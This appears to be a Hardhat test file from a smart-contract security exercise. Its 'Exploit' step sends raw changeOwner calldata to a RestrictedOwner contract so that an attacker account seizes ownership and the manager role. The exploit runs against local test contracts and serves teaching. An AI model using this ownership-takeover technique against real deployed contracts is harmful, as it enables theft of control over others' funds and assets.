import { SignerWithAddress } from '@nomincfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { ethers } from 'hardhat';
const { provider, deployContract, getSigners, parseEther, keccak256, toUtf8Bytes, Interface } = ethers;

import { BlockSafe, BlockSafeFactory, RestrictedOwner, UnrestrictedOwner, DummyERC20, RentingLibrary, SecureStore, CryptoKeeper, CryptoKeeperFactory } from '../typechain-types';

describe('Call Attack Exercise 1', () => {
  let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

  let unrestrictedOwner: UnrestrictedOwner;
  let restrictedOwner: RestrictedOwner;

  before(async () => {
    [deployer, user, attacker] = await getSigners();

    // Deploy
    unrestrictedOwner = await deployContract('UnrestrictedOwner');
    restrictedOwner = await deployContract('RestrictedOwner', [unrestrictedOwner.target]);

    // Any user can take ownership on `UrestrictedOwner` contract
    await expect(unrestrictedOwner.connect(user).changeOwner(user.address)).not.to.be.reverted;
    expect(await unrestrictedOwner.owner()).to.be.equal(user.address);

    // Any user can't take ownership on `RestrictedOwner` contract
    await expect(restrictedOwner.connect(user).updateSettings(user.address, user.address)).to.be.reverted;
    expect(await restrictedOwner.owner()).to.be.equal(deployer.address);
    expect(await restrictedOwner.manager()).to.be.equal(deployer.address);
  });

  it('Exploit', async () => {
    const iface = new Interface(["function changeOwner(address _newOwner)"]);
    const data = iface.encodeFunctionData(`changeOwner`, [attacker.address]);
    await attacker.sendTransaction({
      from: attacker.address,
      to: restrictedOwner.target,
      data: data
    });

    await restrictedOwner.connect(attacker).updateSettings(attacker.address,
      attacker.address);
  });

  after(async () => {
    // Attacker should take ownership on `RestrictedOwner` contract
    expect(await restrictedOwner.owner()).to.be.equal(attacker.address);
    expect(await restrictedOwner.manager()).to.be.equal(attacker.address);
  });
});

